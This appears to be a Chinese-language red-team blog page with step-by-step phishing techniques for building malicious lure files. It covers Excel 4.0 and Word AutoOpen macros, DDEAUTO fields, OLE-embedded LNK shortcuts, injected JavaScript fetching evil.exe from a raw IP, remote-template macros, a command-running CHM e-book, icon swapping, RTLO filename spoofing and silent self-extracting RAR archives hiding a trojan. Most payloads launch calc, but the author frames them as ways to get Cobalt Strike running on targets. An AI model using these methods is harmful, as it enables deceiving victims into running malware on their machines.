@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>钓鱼技巧 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9493\u9c7c\u6280\u5de7", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "OFFICE", url: "#office" },
+              {title: "CHM \u7535\u5b50\u4e66", url: "#chm" },
+              {title: "\u56fe\u6807\u66ff\u6362", url: "#_5" },
+              {title: "RTLO", url: "#rtlo" },
+              {title: "rar\u89e3\u538b\u81ea\u8fd0\u884c", url: "#rar" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../../%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../../%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/" class="btn btn-xs btn-link">
+        脆弱应用
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/" class="btn btn-xs btn-link">
+        利用360安全云
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">钓鱼技巧</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#OFFICE">OFFICE</a><ul>
+<li><a href="#Office安全保护机制">Office安全保护机制</a><ul>
+<li><a href="#受保护的视图">受保护的视图</a></li>
+</ul>
+</li>
+<li><a href="#XLM--Macro-40-excel宏钓鱼">XLM / Macro 4.0 （excel宏钓鱼）</a></li>
+<li><a href="#Word宏">Word宏</a></li>
+<li><a href="#Word-DDE">Word DDE</a></li>
+<li><a href="#office-OLELNK">office OLE+LNK</a></li>
+<li><a href="#嵌入js元素">嵌入js元素</a></li>
+<li><a href="#利用模板文件注入宏指令">利用模板文件注入宏指令</a></li>
+</ul>
+</li>
+<li><a href="#CHM-电子书">CHM 电子书</a></li>
+<li><a href="#图标替换">图标替换</a></li>
+<li><a href="#RTLO">RTLO</a></li>
+<li><a href="#rar解压自运行">rar解压自运行</a></li>
+</ul>
+<hr />
+<h2 id="office">OFFICE</h2>
+<h3 id="office_1">Office安全保护机制</h3>
+<h4 id="_3">受保护的视图</h4>
+<p>为了保护计算机不受office病毒侵害，微软设计了一个收保护视图，将所有可疑的office文件以只读方式打开，在该模式下多数编辑功能被禁用。文件呗以受保护视图打开的情况有如下几种</p>
+<pre><code class="language-text">文件是从 Internet 位置打开的 
+文件是通过 Outlook 附件的方式接收的，并且计算机策略将发件人定义为不安全 
+文件是从不安全的位置打开的
+文件被文件块阻止
+文件验证失败
+文件是使用“在受保护的视图中打开”选项打开的 
+文件是从其他人的 OneDrive 存储中打开的
+</code></pre>
+<h3 id="xlm-macro-40-excel">XLM / Macro 4.0 （excel宏钓鱼）</h3>
+<p>excel下有宏功能，可以用来执行命令。
+其使用方法如下</p>
+<p>右键下方sheet1，选择插入</p>
+<p><img alt="QQ截图20210217150535" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150535.png" title="QQ截图20210217150535" /></p>
+<p>点击 MS Excel4.0宏表，就可在excel中插入一个宏表
+依次输入这两个命令，并把第一行设置为Auto_Open</p>
+<p><img alt="" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150535.png" /></p>
+<p>随后保存为xlsm文件即可。随后当该文件被打开时，会自动打开cmd窗口</p>
+<p><img alt="QQ截图20210217150614" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150614.png" title="QQ截图20210217150614" /></p>
+<p>这里的exec其实是执行的cmd命令，我们可以借此来上线cs等操作。</p>
+<p><img alt="QQ截图20210217150630" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150630.png" title="QQ截图20210217150630" /></p>
+<p>真不错。但在某些情况下打开此类excel文件需手动点击启用宏才能正常钓鱼。</p>
+<h3 id="word">Word宏</h3>
+<p>新建一个word文件，进入宏选项（如果没有请自行在开发者工具里开启</p>
+<p><img alt="QQ截图20210217150658" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150658.png" title="QQ截图20210217150658" /></p>
+<p>然后随便输AutoOpen(文件打开时自动执行宏)，创建，注意宏的位置要指定为当前文档</p>
+<p>然后进入宏编辑框</p>
+<p>输入以下命令</p>
+<pre><code class="language-text">Sub AutoOpen()
+Shell (&quot;calc&quot;)  //只需要写这个就行了
+End Sub
+</code></pre>
+<p>AutoExec：启动 Word 或加载全局模板时
+AutoNew：每次新建文档时
+AutoOpen：每次打开已有文档时
+AutoClose：每次关闭文档时
+AutoExit：退出 Word 或卸载全局模板时</p>
+<p>保存为docm（启用宏的word文档）</p>
+<p>打开文件，就蹦出计算器了。（前提是在信任中心设置开启所有宏）
+当然，一般情况下打开此类文件会显示</p>
+<p><img alt="QQ截图20210217150708" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150708.png" title="QQ截图20210217150708" /></p>
+<p>启用内容后就会弹计算器了</p>
+<h3 id="word-dde">Word DDE</h3>
+<p>在word文件里，输入 ctrl+F9,进入到域代码编辑。我们可以键入以下代码使文件在被打开时执行系统命令（word2019复现未成功，word2016成功，似乎是word版本问题
+这个蛮实用的，目前众多word是默认禁用宏的，dde只需要用户点击两个按钮即可执行，实用性比宏好</p>
+<pre><code class="language-text">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;/k calc.exe&quot; 
+</code></pre>
+<p>随后在打开该文件时会出现两个对话框，全点是就会执行以上命令了</p>
+<p><img alt="QQ截图20210217150729" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150729.png" title="QQ截图20210217150729" /></p>
+<h3 id="office-olelnk">office OLE+LNK</h3>
+<p>核心目标是创建一个内嵌的lnk文件诱导用户点击，从而执行命令。word，excel都能使用</p>
+<p>我们创建一个快捷方式如下</p>
+<p><img alt="QQ截图20210217150802" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150802.png" title="QQ截图20210217150802" /></p>
+<p>其目标处填写的是</p>
+<pre><code class="language-text">%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe -command calc
+</code></pre>
+<p>然后打开word文件，插入对象，选择package，为了更加逼真勾选显示为图标，然后可以更改图标，我们在更改图标处选择一个迷惑性比较大的图标</p>
+<p><img alt="QQ截图20210217150813" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150813.png" title="QQ截图20210217150813" /></p>
+<p>然后进入创建软件包界面，选择我们刚刚创建的lnk文件，写好卷标名，然后就把软件包插入到word界面了，只要用户点击该软件包并选择执行，则会执行我们在lnk中定义的代码</p>
+<p><img alt="QQ截图20210217150822" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150822.png" title="QQ截图20210217150822" /></p>
+<p>而且值得一提的是，如果用上述方法把lnk文件放入publisher文件，则在网络中打开该文件时不会触发受保护视图。（可能是我本地环境有点错？我觉得这个有点离谱</p>
+<p><img alt="QQ截图20210217150831" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150831.png" title="QQ截图20210217150831" /></p>
+<h3 id="js">嵌入js元素</h3>
+<p>这个说实话需要一点js功底。。
+这个方式的原理是，如果我们往word中插入联机视频，那么再word的压缩包 word/document.xml里的embeddedHtml项中会出现联机视频对应的内嵌html代码，我们可以通过修改这些代码，插入恶意js代码。</p>
+<p>一般的利用方式是通过js下载恶意文件，但是似乎是因为word的一些保护机制，不能实现页面跳转或者自动点击下载等操作(打开word文件会报错),好迷</p>
+<pre><code class="language-text">&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+                var a = document.createElement('a');
+                console.log(a);
+                document.body.appendChild(a);
+                a.style = 'display: none';
+                a.href = &quot;http://149.129.64.180/evil.exe&quot;;  //该行若存在，打开word文件会报错
+                a.download = fileName;
+                window.URL.revokeObjectURL(url);
+&lt;/script&gt;
+&lt;script&gt;
+                a.click();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>我看了一个POC，里面是通过构造二进制数据交给BLOB对象处理，并自动点击由BLOB对象生成的url实现下载二进制数据，而这些二进制数据实质上是恶意文件。</p>
+<p>因为我搞不来那个二进制数据怎么产生，所以这个方法暂时只做了解吧。。
+而且我看的那个文章的POC在我的word2016里不能正常工作，不知道是什么原因
+reference:<a href="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload" title="https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload">https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload</a></p>
+<h3 id="_4">利用模板文件注入宏指令</h3>
+<p>原理是，先创建一个带模板的文档，再创一个启用宏的模板文件。然后在带模板的文档的压缩包里面修改一些内容，使其指向的模板修改为我们自己创建的模板文件，这之间的过程可以由smb协议完成，故过查杀几率较高。</p>
+<p>我们在启用宏的模板文件（doc3.dotm)里写入宏。</p>
+<pre><code class="language-text">Sub AutoOpen()
+Shell &quot;calc&quot;
+End Sub
+
+</code></pre>
+<p><img alt="QQ截图20210217150913" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217150913.png" title="QQ截图20210217150913" /></p>
+<h2 id="chm">CHM 电子书</h2>
+<p>新建一个html文件，编码格式ANSI，向里面写入如下内容</p>
+<pre><code class="language-text">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;
+command exec 
+&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
+&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
+ &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
+ &lt;PARAM name=&quot;Item1&quot; value=',cmd.exe,/c calc.exe'&gt;     
+ //这一排用于执行命令，注意cmd.exe前后都有,或者&lt;PARAM name=&quot;Item1&quot; value=',powershell.exe,-c calc.exe'&gt;也行
+ &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;
+&lt;/OBJECT&gt;
+&lt;SCRIPT&gt;
+x.Click();
+&lt;/SCRIPT&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p>用easychm，新建-浏览-选择html文件所在目录-选择html文件-编译</p>
+<p><img alt="image-20210428211335393" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210428211335393.png" title="image-20210428211335393" /></p>
+<p>生成一个chm，双击，打开了计算器</p>
+<p><img alt="image-20210428211402606" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210428211402606.png" title="image-20210428211402606" /></p>
+<h2 id="_5">图标替换</h2>
+<p>使用Restorator，打开需要替换图标的exe，提供图标的exe，如下</p>
+<p><img alt="image-20210428215013591" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210428215013591.png" title="image-20210428215013591" /></p>
+<p>右键main.exe,添加资源，图标，id选择127.
+随后右键Listary.exe/图标/127 导出，将其导出到一个文件夹
+然后右键main.exe/图标，导入，选择刚刚导出图标的文件夹，确定,ctrl+保存</p>
+<p><img alt="image-20210428215309755" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210428215309755.png" title="image-20210428215309755" /></p>
+<h2 id="rtlo">RTLO</h2>
+<p><img alt="image-20210428220222348" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210428220222348.png" title="image-20210428220222348" /></p>
+<p><img alt="image-20210428220237141" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210428220237141.png" title="image-20210428220237141" /></p>
+<p>继续重命名，在a后面右键，插入Unicode控制字符-&gt;RLO</p>
+<p><img alt="image-20210428220402772" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210428220402772.png" title="image-20210428220402772" /></p>
+<h2 id="rar">rar解压自运行</h2>
+<p>木马文件:artifact.exe  迷惑文件:calc.exe
+进入winrar，选中这两个文件，右键添加至压缩包.创建自解压格式压缩文件</p>
+<p><img alt="image-20210429150912549" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210429150912549.png" title="image-20210429150912549" /></p>
+<p>高级-&gt;自解压选项-&gt;设置</p>
+<p><img alt="image-20210429150946457" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210429150946457.png" title="image-20210429150946457" /></p>
+<p>模式-&gt;全部隐藏</p>
+<p><img alt="image-20210429150959133" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210429150959133.png" title="image-20210429150959133" /></p>
+<p>更新-&gt;解压并更新文件,覆盖所有文件</p>
+<p><img alt="image-20210429151020096" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210429151020096.png" title="image-20210429151020096" /></p>
+<p>生成,双击运行</p>
+<p><img alt="image-20210429151229160" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210429151229160.png" title="image-20210429151229160" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../../%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../../%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/" class="btn btn-xs btn-link">
+        脆弱应用
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/" class="btn btn-xs btn-link">
+        利用360安全云
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
